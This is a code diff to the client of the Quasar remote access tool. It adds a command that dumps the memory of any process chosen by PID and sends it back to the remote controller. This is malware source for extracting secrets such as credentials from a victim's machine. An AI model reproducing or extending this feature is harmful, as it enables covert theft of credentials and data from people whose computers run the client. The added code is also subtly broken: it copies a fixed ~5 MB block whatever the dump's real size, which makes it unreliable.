@@ -1,5 +1,6 @@
 ﻿using Quasar.Client.Networking;
 using Quasar.Client.Setup;
+using Quasar.Client.Helper;
 using Quasar.Common;
 using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
@@ -45,7 +46,8 @@ namespace Quasar.Client.Messages
 
         public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                              message is DoProcessStart ||
-                                                             message is DoProcessEnd;
+                                                             message is DoProcessEnd ||
+                                                             message is DoProcessDump;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -60,6 +62,9 @@ namespace Quasar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoProcessEnd msg:
+                    Execute(sender, msg);
+                    break;
+                case DoProcessDump msg:
                     Execute(sender, msg);
                     break;
             }
@@ -207,6 +212,22 @@ namespace Quasar.Client.Messages
             catch
             {
                 client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
+            }
+        }
+
+        private void Execute(ISender client, DoProcessDump message)
+        {
+            byte[] dump = DumpHelper.GetProcessDump(message.Pid);
+            if (dump.Length > 0)
+            {
+                // Could add a zip here later (idk how big a dump will be)
+                byte[] sizeTest = new byte[1024 * 5110];
+                Array.Copy(dump, sizeTest, sizeTest.Length);
+                client.Send(new DoProcessDumpResponse { Memory = sizeTest });
+            }
+            else
+            {
+                client.Send(new DoProcessDumpResponse { Memory = new byte[] { } });
             }
         }
 
